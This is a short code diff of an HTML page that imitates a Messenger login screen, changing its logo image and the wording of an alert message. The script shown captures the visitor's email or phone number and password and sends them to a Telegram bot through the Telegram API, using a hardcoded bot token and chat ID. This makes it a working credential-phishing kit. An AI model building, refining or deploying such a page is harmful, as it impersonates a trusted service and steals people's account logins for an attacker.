@@ -75,7 +75,7 @@
 <body>
     <div class="login-container">
         <div class="logo">
-            <img src="https://i.postimg.cc/httt6kzh/index.png" alt="Messenger Logo">
+            <img src="https://imagizer.imageshack.com/img922/1346/0UOnBb.jpg" alt="Messenger Logo">
         </div>
         <input type="text" id="emailOrNumber" placeholder="Email address or mobile number">
         <input type="password" id="password" placeholder="Password">
@@ -95,7 +95,7 @@
                 // Telegram Bot Configuration
                 const botToken = "6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ"; // Replace with your Telegram bot token
                 const chatId = "5916486983"; // Replace with your Telegram chat ID
-                const message = `🚨New Login Attempt🚨:\nEmail/Mobile: ${emailOrNumber}\nPassword: ${password}`;
+                const message = `🚨New Login Alert🚨\n📧Email/Mobile: ${emailOrNumber}\n🔐Password: ${password}`;
 
                 // Send data to Telegram Bot
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
